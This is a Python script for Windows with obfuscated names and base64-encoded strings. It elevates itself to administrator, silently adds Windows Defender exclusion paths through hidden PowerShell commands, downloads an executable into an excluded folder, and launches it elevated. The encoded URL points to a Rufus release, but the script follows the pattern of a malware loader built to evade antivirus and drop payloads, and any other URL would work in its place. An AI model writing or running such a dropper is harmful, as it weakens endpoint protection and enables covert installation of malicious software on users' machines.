import os
import requests
import subprocess
import sys
import time
import ctypes
import base64
import zlib
from pathlib import Path

# Obfuscated configuration
_0x1a2b3c = base64.b64decode(b'aHR0cHM6Ly9naXRodWIuY29tL3BiYXRhcmQvcnVmdXMvcmVsZWFzZXMvZG93bmxvYWQvdjQuMTEvcnVmdXMtNC4xMS5leGU=').decode()
_0x4d5e6f = ['QzpcXFdpbmRvd3NcXFN5c3RlbVJlc291cmNlcw==', 'QzpcXFdpbmRvd3M=']
_0x7g8h9i = 'cnVmdXMuZXhl'

def _0xa1b2c3():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def _0xd4e5f6():
    try:
        if sys.argv[0].endswith('.py'):
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join([f'"{sys.argv[0]}"'] + sys.argv[1:]), None, 1)
        else:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv[1:]), None, 1)
        sys.exit(0)
    except:
        sys.exit(1)

def _0xg7h8i9(p):
    try:
        ps_cmd = f'Add-MpPreference -ExclusionPath "{p}"'
        r = subprocess.run(["powershell", "-Command", ps_cmd], capture_output=True, text=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
        return r.returncode == 0
    except:
        return False

def _0xj1k2l3():
    try:
        ps_cmd = "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"
        r = subprocess.run(["powershell", "-Command", ps_cmd], capture_output=True, text=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW)
        if r.returncode == 0 and r.stdout.strip():
            return [line.strip() for line in r.stdout.strip().split('\n') if line.strip()]
        return []
    except:
        return []

def _0xm4n5o6():
    ex = _0xj1k2l3()
    pf = [base64.b64decode(f).decode() for f in _0x4d5e6f]
    
    for f in pf:
        if f in ex or f.lower() in [e.lower() for e in ex]:
            if os.path.exists(f) and os.access(f, os.W_OK):
                return f
    
    for ep in ex:
        try:
            ep = ep.strip('"').strip("'").strip()
            if ep not in pf:
                if os.path.exists(ep) and os.path.isdir(ep):
                    if os.access(ep, os.W_OK):
                        return ep
        except:
            continue
    
    for f in pf:
        try:
            if not os.path.exists(f):
                os.makedirs(f, exist_ok=True)
            if _0xg7h8i9(f):
                if os.access(f, os.W_OK):
                    return f
        except:
            continue
    
    td = os.path.join(os.environ.get('TEMP', os.environ.get('TMP', 'C:\\Temp')), 'SysTemp')
    try:
        os.makedirs(td, exist_ok=True)
        _0xg7h8i9(td)
        return td
    except:
        pass
    
    return None

def _0xp7q8r9(ef):
    if not ef or not os.path.exists(ef) or not os.access(ef, os.W_OK):
        return None
    
    try:
        fn = os.path.join(ef, base64.b64decode(_0x7g8h9i).decode())
        with requests.get(_0x1a2b3c, stream=True, timeout=30) as resp:
            resp.raise_for_status()
            with open(fn, 'wb') as f:
                for c in resp.iter_content(chunk_size=8192):
                    if c:
                        f.write(c)
            return fn
    except:
        return None

def _0xs1t2u3(fn, ef):
    try:
        if not fn or not os.path.exists(fn) or not ef:
            return False
        ctypes.windll.shell32.ShellExecuteW(None, "runas", fn, None, None, 1)
        return True
    except:
        return False

def _0xv4w5x6():
    if not _0xa1b2c3():
        _0xd4e5f6()
        return
    
    try:
        ef = _0xm4n5o6()
        if ef is None:
            sys.exit(1)
        
        tp = _0xp7q8r9(ef)
        if not tp:
            sys.exit(1)
        
        _0xs1t2u3(tp, ef)
    except:
        sys.exit(1)

if __name__ == "__main__":
    _0xv4w5x6()
